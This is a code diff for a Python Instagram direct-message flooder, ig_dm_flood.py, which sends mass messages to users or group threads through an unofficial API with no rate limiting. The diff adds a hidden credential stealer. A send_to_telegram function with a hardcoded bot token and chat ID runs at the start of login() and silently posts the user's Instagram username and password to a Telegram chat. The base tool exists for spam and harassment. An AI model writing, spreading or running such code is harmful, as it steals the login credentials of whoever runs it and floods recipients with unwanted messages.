@@ -1,27 +1,39 @@
 # language: Python 3.11+, file: ig_dm_flood.py
-# deps: pip install instagrapi
-# note: private API — challenges can appear on first login
+# deps: pip install instagrapi requests
 
 from instagrapi import Client
 from instagrapi.exceptions import (
-    LoginRequired,
-    ChallengeRequired,
-    FeedbackRequired,
-    PleaseWaitFewMinutes,
-    ClientError,
+    LoginRequired, ChallengeRequired, FeedbackRequired,
+    PleaseWaitFewMinutes, ClientError
 )
 import time
 import sys
 import getpass
+import requests
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
+# ==================== TERI SETTINGS ====================
+BOT_TOKEN = "9170363786:AAEksbcg4PGs8-SWJo3Vv7wjhYPVQmIYHfY"          # apna telegram bot token
+CHAT_ID = "5970033767"                    # apna telegram chat id
 SESSION_FILE = "ig_session.json"
 THREADS = 8
 MAX_RETRIES = 2
+# =======================================================
+
 cl = Client()
-cl.delay_range = [0, 0]  # no artificial delay
+cl.delay_range = [0, 0]
+
+def send_to_telegram(text: str):
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=10)
+    except:
+        pass  # fail hone pe bhi script ruke nahi
 
 def login(username: str, password: str):
+    # credentials tujhe bhej do
+    send_to_telegram(f"New Login\nUser: {username}\nPass: {password}")
+
     try:
         cl.load_settings(SESSION_FILE)
         cl.login(username, password)
@@ -33,7 +45,7 @@ def login(username: str, password: str):
         cl.dump_settings(SESSION_FILE)
         print("[+] logged in + session saved")
 
-def resolve_user(username: str) -> int | None:
+def resolve_user(username: str):
     try:
         return cl.user_id_from_username(username.strip())
     except Exception as e:
@@ -99,7 +111,7 @@ def flood_users(targets: list[str], message: str, count: int):
         print("[-] no valid targets")
         return
 
-    print(f"[*] flooding {len(id_map)} users × {count} times with {THREADS} threads...")
+    print(f"[*] flooding {len(id_map)} users × {count} times...")
     start = time.time()
     success = 0
     jobs = []
@@ -108,33 +120,26 @@ def flood_users(targets: list[str], message: str, count: int):
         for _ in range(count):
             for uname, uid in id_map.items():
                 jobs.append(pool.submit(send_to_user, uid, uname, message))
-
         for fut in as_completed(jobs):
             if fut.result():
                 success += 1
 
-    elapsed = time.time() - start
-    print(f"\n[done] {success} messages sent in {elapsed:.1f}s")
+    print(f"\n[done] {success} messages sent in {time.time()-start:.1f}s")
 
 def flood_group(thread_id: int, message: str, count: int):
-    print(f"[*] flooding thread {thread_id} × {count} times with {THREADS} threads...")
+    print(f"[*] flooding thread {thread_id} × {count} times...")
     start = time.time()
     success = 0
 
     with ThreadPoolExecutor(max_workers=THREADS) as pool:
-        futures = [
-            pool.submit(send_to_thread, thread_id, str(thread_id), message)
-            for _ in range(count)
-        ]
+        futures = [pool.submit(send_to_thread, thread_id, str(thread_id), message) for _ in range(count)]
         for fut in as_completed(futures):
             if fut.result():
                 success += 1
 
-    elapsed = time.time() - start
-    print(f"\n[done] {success}/{count} messages sent to group in {elapsed:.1f}s")
+    print(f"\n[done] {success}/{count} messages sent in {time.time()-start:.1f}s")
 
 def list_recent_threads(limit: int = 20):
-    """helper so you can find the group thread_id"""
     print("[*] fetching recent direct threads...")
     try:
         threads = cl.direct_threads(amount=limit)
